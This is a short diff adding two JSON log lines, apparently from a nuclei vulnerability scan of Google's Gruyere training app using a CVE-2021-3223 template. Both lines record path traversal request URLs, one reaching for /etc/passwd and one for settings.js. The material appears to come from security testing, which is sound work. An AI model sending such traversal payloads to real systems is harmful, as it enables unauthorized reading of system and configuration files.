@@ -1,0 +1,2 @@
+{"template":"C:\\Users\\rnorena\\nuclei-templates\\http\\cves\\2021\\CVE-2021-3223.yaml","input":"https://google-gruyere.appspot.com/432947565819739667646424739745632276508/ui_base/js/../../../../../../../../../../etc/passwd","error":"none","type":"http"}
+{"template":"C:\\Users\\rnorena\\nuclei-templates\\http\\cves\\2021\\CVE-2021-3223.yaml","input":"https://google-gruyere.appspot.com/432947565819739667646424739745632276508/ui_base/js/../../../../settings.js","error":"none","type":"http"}
